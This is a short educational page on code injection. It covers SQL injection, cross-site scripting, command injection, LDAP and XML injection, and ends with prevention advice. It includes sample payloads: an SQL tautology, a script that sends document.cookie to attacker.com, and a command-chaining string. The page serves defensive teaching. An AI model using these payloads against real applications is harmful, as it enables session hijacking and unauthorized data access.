# Code Injection

Code Injection refers to the malicious practice of injecting unauthorized code into an application, enabling an attacker to execute unintended commands or access unauthorized data. This can occur in various forms, including SQL Injection, OS Command Injection, and Cross-Site Scripting (XSS). It typically happens when an application processes untrusted input without proper validation or encoding.

### Types of Code Injection Attacks:
#### SQL Injection (SQLi):
Occurs when an attacker can insert malicious SQL queries through input fields, which the database then executes.
```sql
Input: ' OR '1'='1
Query: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
```
#### Cross-Site Scripting (XSS):
Attackers inject malicious scripts into content that is then served to users.

```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

#### Command Injection:
Occurs when an attacker can execute arbitrary commands on the host operating system through insufficiently secured application.

```text
; ls -al
```

#### LDAP Injection:
Attackers manipulate LDAP statements to alter the application’s pre-designed LDAP queries, potentially accessing unauthorized data.

#### XML Injection:
Attackers manipulate XML data to compromise the logic of the application and perform unauthorized actions.

### Prevention Techniques:

-  `Input Validation:`
Validate user input against a set of strict rules (whitelist), rejecting any inputs that do not conform.

- ` Output Encoding:`
Encode data when outputting it to the user to prevent malicious content from being interpreted as part of the document.

-  `Parameterized Queries:`
Use parameterized queries or prepared statements to prevent SQL injection attacks.

- `Use of Security Headers:`
Implement security headers like Content-Security-Policy to mitigate XSS attacks.

-  `Code Review and Static Analysis:`
Regularly review code to identify injection vulnerabilities and use static analysis tools to scan codebases for vulnerabilities.

- ` Least Privilege Principle:`
Restrict the permissions of applications to the minimum necessary to perform their tasks to reduce the impact of successful attacks.

